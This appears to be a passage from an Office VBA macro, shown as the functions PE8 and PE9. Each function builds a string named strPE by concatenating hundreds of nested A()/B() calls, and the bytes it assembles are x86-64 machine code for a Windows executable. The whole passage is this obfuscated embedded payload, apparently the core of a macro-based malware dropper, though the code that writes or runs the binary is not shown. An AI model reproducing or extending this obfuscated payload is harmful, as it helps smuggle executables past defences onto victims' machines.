    strPE = A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 255), 255), 15), 31), "@"), 0), 131), 248), 3), 15), 133), 175), 251), 255), 255), 199), "D$h"), 0), 0), 0), 0), 139), "D$pD"), 1), 240), 137), 132), "$"), 140), 0), 0), 0), 131), 192), 1), 137), "D$L"), 133), 192), 15), 142), "W"), 4)
    strPE = A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 137), 132), "$"), 156), 0), 0), 0), 137), 193), 233), "9"), 249), 255), 255), 15), 31), "@"), 0), "D"), 139), "\$hE"), 133), 219), 15), 133), 226), 251), 255), 255), "D"), 139), "l$t"), 139), "l$`E1"), 228), 233), "d"), 252), 255)
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(strPE, 255), "E1"), 237), "E1"), 228), "A"), 247), 222), 199), "D$H"), 16), 0), 0), 0), "H"), 139), "\$XD"), 137), "t$P"), 233), 227), 253), 255), 255), 144), "D"), 137), 210), "L"), 137), 233), 232), 21), 18), 0), 0), 132), 219), "D"), 139), "T")
    strPE = B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(strPE, "$tI"), 137), 197), 15), 133), 176), 8), 0), 0), 199), "D$t"), 0), 0), 0), 0), "A"), 139), "E"), 20), 131), 232), 1), "H"), 152), "A"), 15), 189), "|"), 133), 24), 131), 247), 31), 233), 226), 252), 255), 255), "f"), 15), 31), "D"), 0), 0), 139), "D")
    strPE = A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(strPE, "$p"), 131), 192), 1), 137), "D$P"), 139), "D$h"), 133), 192), 15), 132), 201), 2), 0), 0), 141), 20), "/"), 133), 210), "~"), 11), "L"), 137), 225), 232), 186), 19), 0), 0), "I"), 137), 196), 139), "D$tM"), 137), 230), 133), 192), 15), 133)
    strPE = A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(strPE, 156), 7), 0), 0), "H"), 139), "D$XH"), 137), "t$h"), 199), 132), "$"), 156), 0), 0), 0), 1), 0), 0), 0), "H"), 137), "D$@"), 233), 173), 0), 0), 0), "f"), 15), 31), 132), 0), 0), 0), 0), 0), "H"), 137), 193), 232), "8"), 14)
    strPE = B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 184), 1), 0), 0), 0), 133), 255), 15), 136), 1), 5), 0), 0), 11), "|$ u"), 14), "H"), 139), "|$8"), 246), 7), 1), 15), 132), 237), 4), 0), 0), "H"), 139), "t$@H"), 141), "n"), 1), 133), 192), "~"), 11), 131), "|")
    strPE = A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(strPE, "$T"), 2), 15), 133), 175), 7), 0), 0), 136), "]"), 255), 139), "D$L9"), 132), "$"), 156), 0), 0), 0), 15), 132), 198), 7), 0), 0), "L"), 137), 249), "E1"), 192), 186), 10), 0), 0), 0), 232), "K"), 14), 0), 0), "E1"), 192), 186), 10)
    strPE = A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(strPE, 0), 0), 0), "L"), 137), 225), "I"), 137), 199), "M9"), 244), 15), 132), "$"), 1), 0), 0), 232), "/"), 14), 0), 0), "L"), 137), 241), "E1"), 192), 186), 10), 0), 0), 0), "I"), 137), 196), 232), 28), 14), 0), 0), "I"), 137), 198), 131), 132), "$"), 156), 0)
    strPE = B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(strPE, 0), 0), 1), "H"), 137), "l$@L"), 137), 234), "L"), 137), 249), 232), 209), 241), 255), 255), "L"), 137), 226), "L"), 137), 249), 137), 198), 141), "X0"), 232), 209), 19), 0), 0), "L"), 137), 242), "L"), 137), 233), 137), 199), 232), 20), 20), 0), 0), 139), "h")
    strPE = A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(strPE, 16), 133), 237), 15), 133), ")"), 255), 255), 255), "H"), 137), 194), "L"), 137), 249), "H"), 137), "D$`"), 232), 169), 19), 0), 0), "L"), 139), "D$`"), 137), 197), "L"), 137), 193), 232), "J"), 13), 0), 0), 139), "D$ "), 9), 232), 15), 133), 183), 9)
    strPE = A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(strPE, 0), 0), "H"), 139), "L$8"), 139), 17), 137), "T$`"), 131), 226), 1), 11), "T$T"), 15), 133), 243), 254), 255), 255), "H"), 139), "T$@"), 137), "t$ H"), 139), "t$hH"), 141), "j"), 1), 131), 251), "9"), 15), 132), 178)
    strPE = A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 7), 0), 0), 133), 255), 15), 142), "Y"), 9), 0), 0), 139), "\$ "), 184), " "), 0), 0), 0), 131), 195), "1H"), 139), "|$@"), 137), "D$H"), 136), 31), "L"), 137), 231), "M"), 137), 244), "f"), 15), 31), "D"), 0), 0), "L"), 137), 233), 232)
    strPE = A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 216), 12), 0), 0), "M"), 133), 228), 15), 132), 1), 3), 0), 0), "H"), 133), 255), 15), 132), 162), 7), 0), 0), "L9"), 231), 15), 132), 153), 7), 0), 0), "H"), 137), 249), 232), 181), 12), 0), 0), "H"), 139), "\$XH"), 137), "l$X"), 233)
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(strPE, 181), 251), 255), 255), "f"), 15), 31), "D"), 0), 0), 232), 11), 13), 0), 0), "I"), 137), 196), "I"), 137), 198), 233), 231), 254), 255), 255), 199), "D$h"), 1), 0), 0), 0), 233), "4"), 253), 255), 255), 15), 31), 0), 131), "|$ "), 1), 15), 142), 164)
    strPE = B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(strPE, 249), 255), 255), 139), "D$L"), 139), "L$t"), 131), 232), 1), "9"), 193), 15), 140), 189), 2), 0), 0), ")"), 193), "A"), 137), 205), 139), "D$L"), 133), 192), 15), 136), 13), 5), 0), 0), 139), "L$`"), 1), "D$P"), 137), 132), "$")
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(strPE, 156), 0), 0), 0), 1), 200), 137), 205), 137), "D$`"), 233), "y"), 249), 255), 255), 15), 31), "D"), 0), 0), "L"), 137), 234), "L"), 137), 249), 232), "u"), 18), 0), 0), 133), 192), 15), 137), 184), 250), 255), 255), 139), "D$pE1"), 192), 186), 10)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(strPE, 0), 0), 0), "L"), 137), 249), 131), 232), 1), 137), "D$@"), 232), "r"), 12), 0), 0), 139), "T$hI"), 137), 199), 139), 132), "$"), 140), 0), 0), 0), 133), 192), 15), 158), 192), "!"), 195), 133), 210), 15), 133), "T"), 7), 0), 0), 132), 219), 15)
    strPE = B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(strPE, 133), 161), 6), 0), 0), 139), "D$p"), 137), "D$P"), 139), 132), "$"), 140), 0), 0), 0), 137), "D$Lf."), 15), 31), 132), 0), 0), 0), 0), 0), 199), 132), "$"), 156), 0), 0), 0), 1), 0), 0), 0), "H"), 139), "l$X")
    strPE = B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(strPE, 139), "|$L"), 235), "%f."), 15), 31), 132), 0), 0), 0), 0), 0), "L"), 137), 249), "E1"), 192), 186), 10), 0), 0), 0), 232), 0), 12), 0), 0), 131), 132), "$"), 156), 0), 0), 0), 1), "I"), 137), 199), "L"), 137), 234), "L"), 137), 249), "H")

    PE8 = strPE
End Function

Private Function PE9() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(strPE, 131), 197), 1), 232), 182), 239), 255), 255), 141), "X0"), 136), "]"), 255), "9"), 188), "$"), 156), 0), 0), 0), "|"), 199), "1"), 255), 139), "L$T"), 133), 201), 15), 132), 227), 1), 0), 0), "A"), 139), "G"), 20), 15), 182), "U"), 255), 131), 249), 2), 15), 132)
    strPE = A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(strPE, 8), 2), 0), 0), 131), 248), 1), 127), 9), "E"), 139), "G"), 24), "E"), 133), 192), "tAH"), 139), "L$X"), 235), 19), 15), 31), 0), "H9"), 200), 15), 132), 151), 1), 0), 0), 15), 182), "P"), 255), "H"), 137), 197), "H"), 141), "E"), 255), 128), 250)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(strPE, "9t"), 231), 131), 194), 1), 199), "D$H "), 0), 0), 0), 136), 16), 233), "%"), 254), 255), 255), 15), 31), "D"), 0), 0), 15), 182), "U"), 254), "H"), 137), 197), "H"), 141), "E"), 255), 128), 250), "0t"), 240), 233), 11), 254), 255), 255), 15), 31), 0)
    strPE = B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 199), "D$h"), 1), 0), 0), 0), 233), 207), 244), 255), 255), 199), 132), "$"), 156), 0), 0), 0), 1), 0), 0), 0), 185), 1), 0), 0), 0), 233), 219), 244), 255), 255), "HcD$pH"), 139), 21), "zF"), 0), 0), 199), "D$L")
    strPE = B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 255), 255), 255), 255), 242), 15), 16), 20), 194), 242), 15), 16), 132), "$"), 128), 0), 0), 0), "D"), 139), "D$p"), 199), 132), "$"), 156), 0), 0), 0), 1), 0), 0), 0), "H"), 139), "|$Xf"), 15), 16), 200), "A"), 131), 192), 1), 242), 15), "^")
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(strPE, 202), "D"), 137), "D$PH"), 141), "G"), 1), 242), 15), ","), 201), "f"), 15), 239), 201), 242), 15), "*"), 201), 141), "Q0"), 136), 23), 242), 15), "Y"), 202), 242), 15), "\"), 193), "f"), 15), "."), 198), 15), 139), "l"), 6), 0), 0), 242), 15), 16), 29), 135)
    strPE = A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "C"), 0), 0), 15), 31), 128), 0), 0), 0), 0), 139), 148), "$"), 156), 0), 0), 0), ";T$L"), 15), 132), 236), 1), 0), 0), 242), 15), "Y"), 195), 131), 194), 1), "H"), 131), 192), 1), 137), 148), "$"), 156), 0), 0), 0), "f"), 15), 16), 200), 242)
    strPE = A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(strPE, 15), "^"), 202), 242), 15), ","), 201), "f"), 15), 239), 201), 242), 15), "*"), 201), 141), "Q0"), 136), "P"), 255), 242), 15), "Y"), 202), 242), 15), "\"), 193), "f"), 15), "."), 198), "z"), 181), "u"), 179), "H"), 139), "\$XH"), 137), "D$X"), 233), 3), 249)
    strPE = A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(strPE, 255), 255), 139), "T$tL"), 137), 249), "D"), 137), "T$x"), 232), 27), 13), 0), 0), "D"), 139), "T$xI"), 137), 199), 233), 188), 247), 255), 255), "H"), 139), "\$XH"), 137), "l$X"), 233), 214), 248), 255), 255), "L"), 137), 249)
    strPE = A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(strPE, "D"), 137), "T$t"), 232), 242), 12), 0), 0), "D"), 139), "T$tI"), 137), 199), 233), 147), 247), 255), 255), 137), 194), "+T$tE1"), 237), 137), "D$tA"), 1), 210), 233), "3"), 253), 255), 255), "H"), 139), "D$X"), 131)
    strPE = B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(strPE, "D$P"), 1), 199), "D$H "), 0), 0), 0), 198), 0), "1"), 233), 150), 252), 255), 255), "L"), 137), 249), 186), 1), 0), 0), 0), 232), 169), 14), 0), 0), "L"), 137), 234), "H"), 137), 193), "I"), 137), 199), 232), 171), 15), 0), 0), 15), 182), "U")
    strPE = B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 255), 133), 192), 15), 143), 21), 254), 255), 255), "u"), 9), 131), 227), 1), 15), 133), 10), 254), 255), 255), "A"), 139), "G"), 20), 131), 248), 1), 15), 142), 217), 4), 0), 0), 199), "D$H"), 16), 0), 0), 0), 233), "1"), 254), 255), 255), "H"), 139), "|$")
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "@D"), 139), "\$T"), 137), "t$ H"), 139), "t$hL"), 141), "O"), 1), "L"), 137), 205), "E"), 133), 219), 15), 132), "U"), 3), 0), 0), "A"), 131), 127), 20), 1), 15), 142), 200), 4), 0), 0), 131), "|$T"), 2), 15), 132), 133)
    strPE = A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(strPE, 3), 0), 0), "H"), 137), "t$ L"), 137), 207), "L"), 137), 246), "L"), 139), "t$@"), 235), "O"), 15), 31), 128), 0), 0), 0), 0), 136), "_"), 255), "E1"), 192), "H"), 137), 241), 186), 10), 0), 0), 0), "I"), 137), 254), 232), "2"), 9), 0), 0)
    strPE = B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(strPE, "I9"), 244), "L"), 137), 249), 186), 10), 0), 0), 0), "L"), 15), "D"), 224), "E1"), 192), "H"), 137), 197), "H"), 131), 199), 1), 232), 20), 9), 0), 0), "L"), 137), 234), "H"), 137), 238), "H"), 137), 193), "I"), 137), 199), 232), 211), 236), 255), 255), 141), "X0")
    strPE = A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(strPE, "H"), 137), 242), "L"), 137), 233), "H"), 137), 253), 232), 210), 14), 0), 0), 133), 192), 127), 166), "L"), 137), "t$@I"), 137), 246), "H"), 139), "t$ "), 131), 251), "9"), 15), 132), 15), 3), 0), 0), 199), "D$H "), 0), 0), 0), "L"), 137)
    strPE = B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(strPE, 231), 131), 195), 1), "M"), 137), 244), "H"), 139), "D$@"), 136), 24), 233), "k"), 251), 255), 255), 139), "|$T"), 133), 255), 15), 132), "*"), 3), 0), 0), 131), 255), 1), 15), 132), 241), 3), 0), 0), "H"), 139), "\$XH"), 137), "D$X")
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(strPE, 199), "D$H"), 16), 0), 0), 0), 233), "6"), 247), 255), 255), 242), 15), "Y"), 226), "H"), 139), "D$Xf"), 15), 16), 200), "E1"), 192), 199), 132), "$"), 156), 0), 0), 0), 1), 0), 0), 0), 242), 15), 16), 21), "4A"), 0), 0), 235), 27)
    strPE = A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(strPE, "f."), 15), 31), 132), 0), 0), 0), 0), 0), 242), 15), "Y"), 202), 131), 193), 1), "E"), 137), 200), 137), 140), "$"), 156), 0), 0), 0), 242), 15), ","), 209), 133), 210), "t"), 15), "f"), 15), 239), 219), "E"), 137), 200), 242), 15), "*"), 218), 242), 15), "\"), 203)
    strPE = B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(strPE, "H"), 131), 192), 1), 131), 194), "0"), 136), "P"), 255), 139), 140), "$"), 156), 0), 0), 0), "D9"), 217), "u"), 194), "E"), 132), 192), 15), 132), 15), 3), 0), 0), 242), 15), 16), 5), 17), "A"), 0), 0), "f"), 15), 16), 212), 242), 15), "X"), 208), "f"), 15), "/")
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(strPE, 202), 15), 135), 225), 2), 0), 0), 242), 15), "\"), 196), "f"), 15), "/"), 193), 15), 134), 169), 247), 255), 255), "f"), 15), "."), 206), "H"), 139), "\$Xz"), 10), "f"), 15), "/"), 206), 15), 132), 164), 3), 0), 0), 199), "D$H"), 16), 0), 0), 0)
    strPE = B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(B(strPE, "D"), 141), "E"), 1), "H"), 137), 194), "H"), 141), "@"), 255), 128), "z"), 255), "0t"), 243), "H"), 137), "T$XD"), 137), "D$P"), 233), "["), 246), 255), 255), 199), 132), "$"), 156), 0), 0), 0), 0), 0), 0), 0), 139), "l$`+l$")
    strPE = A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(strPE, "L"), 233), "p"), 244), 255), 255), 139), "L$L"), 133), 201), 15), 132), 242), 246), 255), 255), "D"), 139), 156), "$"), 140), 0), 0), 0), "E"), 133), 219), 15), 142), "7"), 247), 255), 255), 242), 15), "Y"), 5), "?@"), 0), 0), 242), 15), 16), 13), "?@"), 0)
    strPE = A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 0), 189), 255), 255), 255), 255), 242), 15), "Y"), 200), 242), 15), "X"), 13), "6@"), 0), 0), "fH"), 15), "~"), 202), "fH"), 15), "~"), 200), "H"), 193), 234), " "), 137), 192), 129), 234), 0), 0), "@"), 3), "H"), 193), 226), " H"), 9), 208), 233), 196), 241)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(strPE, 255), 255), "A"), 139), "L$"), 8), 232), 194), 5), 0), 0), "I"), 141), "T$"), 16), "I"), 137), 198), "H"), 141), "H"), 16), "IcD$"), 20), "L"), 141), 4), 133), 8), 0), 0), 0), 232), 20), 18), 0), 0), "L"), 137), 241), 186), 1), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(strPE, 232), 215), 11), 0), 0), "I"), 137), 198), 233), "'"), 248), 255), 255), 139), "G"), 4), 131), 192), 1), ";D$@"), 15), 141), 173), 244), 255), 255), 131), "D$`"), 1), 131), "D$P"), 1), 199), "D$t"), 1), 0), 0), 0), 233), 150), 244)
    strPE = A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(strPE, 255), 255), 199), "D$P"), 2), 0), 0), 0), "H"), 139), "\$XE1"), 237), "E1"), 228), 233), "A"), 245), 255), 255), "H"), 139), "t$h"), 131), 251), "9"), 15), 132), 233), 0), 0), 0), "H"), 139), "D$@"), 131), 195), 1), "L"), 137)
    strPE = A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 231), 199), "D$H "), 0), 0), 0), "M"), 137), 244), 136), 24), 233), "E"), 249), 255), 255), "L"), 137), 231), "H"), 139), "t$hM"), 137), 244), 233), 176), 250), 255), 255), 139), "G"), 4), 131), 192), 1), "9D$@"), 127), 138), 233), "?"), 247)
    strPE = A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(strPE, 255), 255), "A)"), 220), "D"), 137), 233), 139), "W"), 4), "E1"), 246), "A"), 141), "D$"), 1), "D)"), 225), 199), 132), "$"), 140), 0), 0), 0), 255), 255), 255), 255), 137), 132), "$"), 156), 0), 0), 0), 199), "D$L"), 255), 255), 255), 255), "9"), 209)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 15), 140), 190), 242), 255), 255), 233), 248), 242), 255), 255), 131), "D$P"), 1), 186), "1"), 0), 0), 0), "H"), 137), "L$X"), 198), 3), "0"), 233), 171), 241), 255), 255), 133), 192), "~7L"), 137), 249), 186), 1), 0), 0), 0), 232), 225), 10), 0)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(strPE, 0), "L"), 137), 234), "H"), 137), 193), "I"), 137), 199), 232), 227), 11), 0), 0), 133), 192), 15), 142), 171), 1), 0), 0), 131), 251), "9t-"), 139), "\$ "), 199), "D$T "), 0), 0), 0), 131), 195), "1A"), 131), 127), 20), 1), 15), 142)
    strPE = A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(strPE, "e"), 1), 0), 0), "L"), 137), 231), 199), "D$H"), 16), 0), 0), 0), "M"), 137), 244), 233), 2), 253), 255), 255), "H"), 139), "D$@L"), 137), 231), "H"), 139), "L$XM"), 137), 244), 186), "9"), 0), 0), 0), 198), 0), "9"), 233), 28), 250)
    strPE = B(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(strPE, 255), 255), 139), "D$@"), 137), "D$p"), 139), 132), "$"), 140), 0), 0), 0), 137), "D$L"), 233), 211), 243), 255), 255), "H"), 139), "\$XH"), 137), "l$X"), 233), "$"), 244), 255), 255), 242), 15), "X"), 192), 15), 182), "P"), 255), "f")
    strPE = B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(strPE, 15), "/"), 194), 15), 135), 239), 0), 0), 0), "f"), 15), "."), 194), "H"), 139), "\$Xz"), 11), "u"), 9), 128), 225), 1), 15), 133), 210), 240), 255), 255), 199), "D$H"), 16), 0), 0), 0), 233), 128), 253), 255), 255), "f"), 15), "."), 198), 141), "}")
    strPE = B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(strPE, 1), "H"), 139), "\$XH"), 137), "D$X"), 137), "|$P"), 15), 138), 153), 252), 255), 255), "f"), 15), "/"), 198), 15), 133), 143), 252), 255), 255), 199), "D$H"), 0), 0), 0), 0), 233), 197), 243), 255), 255), 141), "}"), 1), "H"), 139), "\")
    strPE = A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(strPE, "$XH"), 137), 193), 137), "|$P"), 233), 130), 240), 255), 255), "f"), 15), 16), 200), 233), 232), 252), 255), 255), "L"), 137), 225), "E1"), 192), 186), 10), 0), 0), 0), 232), 241), 4), 0), 0), "I"), 137), 196), 132), 219), 15), 133), ":"), 255), 255), 255)
    strPE = A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(strPE, 139), "D$p"), 137), "D$P"), 139), 132), "$"), 140), 0), 0), 0), 137), "D$L"), 233), 213), 245), 255), 255), "A"), 139), "O"), 24), 184), 16), 0), 0), 0), 133), 201), 15), "DD$H"), 137), "D$H"), 233), "L"), 249), 255), 255), 15)
    strPE = A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(strPE, 182), "P"), 255), "H"), 139), "\$XH"), 137), 193), 233), 28), 240), 255), 255), "E"), 139), "W"), 24), "E"), 133), 210), 15), 133), "+"), 251), 255), 255), 133), 192), 15), 143), "q"), 254), 255), 255), "L"), 137), 231), "M"), 137), 244), 233), 189), 251), 255), 255), "H"), 139)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(strPE, "\$XH"), 137), 193), 233), 239), 239), 255), 255), "E"), 139), "O"), 24), "L"), 137), 231), "M"), 137), 244), "E"), 133), 201), "tA"), 199), "D$H"), 16), 0), 0), 0), 233), 148), 251), 255), 255), 15), 132), 234), 249), 255), 255), 233), 137), 249), 255), 255)
    strPE = A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(strPE, "u"), 9), 246), 195), 1), 15), 133), "J"), 254), 255), 255), 199), "D$T "), 0), 0), 0), 233), "Q"), 254), 255), 255), 199), "D$H"), 0), 0), 0), 0), "D"), 141), "E"), 1), 233), "W"), 252), 255), 255), 139), "D$T"), 137), "D$H"), 233)
    strPE = B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(strPE, "S"), 251), 255), 255), "A"), 131), 127), 20), 1), "~"), 10), 184), 16), 0), 0), 0), 233), 162), 246), 255), 255), "A"), 131), 127), 24), 0), 186), 16), 0), 0), 0), 15), "E"), 194), 233), 144), 246), 255), 255), 137), 232), 233), "M"), 245), 255), 255), "ATUW")
